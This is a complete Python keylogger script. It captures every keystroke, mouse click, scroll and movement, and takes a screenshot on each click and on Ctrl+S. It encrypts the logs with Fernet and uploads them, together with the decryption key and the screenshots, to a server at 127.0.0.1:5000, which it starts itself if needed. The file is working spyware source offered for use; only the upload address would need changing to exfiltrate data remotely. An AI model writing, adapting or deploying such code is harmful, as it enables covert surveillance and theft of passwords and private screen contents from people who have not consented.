import os
import datetime
import requests
from pynput import keyboard, mouse
from cryptography.fernet import Fernet
import time
from PIL import ImageGrab
import io
import subprocess
import socket

# --- Configuration --- #
UPLOAD_URL = "http://127.0.0.1:5000/upload"
LOG_ENCRYPTION_KEY = Fernet.generate_key()
fernet = Fernet(LOG_ENCRYPTION_KEY)
log_buffer = []
last_mouse_move_time = 0
MOUSE_MOVE_INTERVAL = 1
current_keys = set()

# --- Start server if not running --- #
def ensure_server_running():
    try:
        socket.create_connection(("127.0.0.1", 5000), timeout=2)
    except:
        print("[INFO] Server not running. Starting...")
        subprocess.Popen(["python", "server.py", "--threaded"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(3)

# --- Screenshot --- #
def take_screenshot():
    try:
        screenshot = ImageGrab.grab()
        img_byte_arr = io.BytesIO()
        screenshot.save(img_byte_arr, format='PNG')
        return img_byte_arr.getvalue(), datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    except Exception as e:
        print(f"[ERROR] Screenshot failed: {e}")
        return None, None

# --- Logging --- #
def encrypt_log():
    encrypted_lines = []
    for line in log_buffer:
        encrypted = fernet.encrypt(line.encode())
        encrypted_lines.append(encrypted)
    log_buffer.clear()
    return encrypted_lines

# --- Upload --- #
def upload_to_server(screenshot_data=None, screenshot_timestamp=None):
    encrypted_lines = encrypt_log()
    if not encrypted_lines and not screenshot_data:
        return

    files = {
        "key": ("secret.key", LOG_ENCRYPTION_KEY, "application/octet-stream"),
        "log": ("encrypted_keylog.txt", b"\n".join(encrypted_lines), "text/plain")
    }

    if screenshot_data and screenshot_timestamp:
        files[f"screenshot_{screenshot_timestamp}.png"] = ("screenshot.png", screenshot_data, "image/png")

    try:
        requests.post(UPLOAD_URL, files=files)
    except Exception as e:
        print(f"[ERROR] Upload error: {e}")

# --- Handlers --- #
def on_key_press(key):
    global current_keys
    try:
        if hasattr(key, 'char') and key.char is not None:
            log_buffer.append(f"[KEY_PRESS] {key.char}")
            current_keys.add(key.char)
        else:
            log_buffer.append(f"[KEY_PRESS] [{key.name}]")
            current_keys.add(key)

        if (keyboard.Key.ctrl_l in current_keys or keyboard.Key.ctrl_r in current_keys) and \
           (hasattr(key, 'char') and key.char == 's'):
            shot, ts = take_screenshot()
            if shot:
                upload_to_server(shot, ts)
    except Exception as e:
        log_buffer.append(f"[KEY_PRESS ERROR] {e}")

def on_key_release(key):
    global current_keys
    try:
        if hasattr(key, 'char') and key.char is not None:
            current_keys.discard(key.char)
        else:
            current_keys.discard(key)
    except: pass

    if key == keyboard.Key.esc:
        print("[INFO] ESC pressed. Uploading and exiting...")
        upload_to_server()
        return False

def on_click(x, y, button, pressed):
    action = "Pressed" if pressed else "Released"
    log_buffer.append(f"[MOUSE_CLICK] {action} at ({x}, {y}) with {button}")
    if pressed:
        shot, ts = take_screenshot()
        if shot:
            upload_to_server(shot, ts)

def on_scroll(x, y, dx, dy):
    log_buffer.append(f"[MOUSE_SCROLL] at ({x}, {y}) scrolled ({dx}, {dy})")

def on_move(x, y):
    global last_mouse_move_time
    now = time.time()
    if now - last_mouse_move_time > MOUSE_MOVE_INTERVAL:
        log_buffer.append(f"[MOUSE_MOVE] to ({x}, {y})")
        last_mouse_move_time = now

# --- Main --- #
def main():
    ensure_server_running()
    print("[INFO] Keylogger running. Press ESC to stop.")

    k_listener = keyboard.Listener(on_press=on_key_press, on_release=on_key_release)
    m_listener = mouse.Listener(on_click=on_click, on_scroll=on_scroll, on_move=on_move)

    k_listener.start()
    m_listener.start()

    k_listener.join()
    m_listener.stop()
    print("[INFO] Keylogger exited.")

if __name__ == "__main__":
    main()
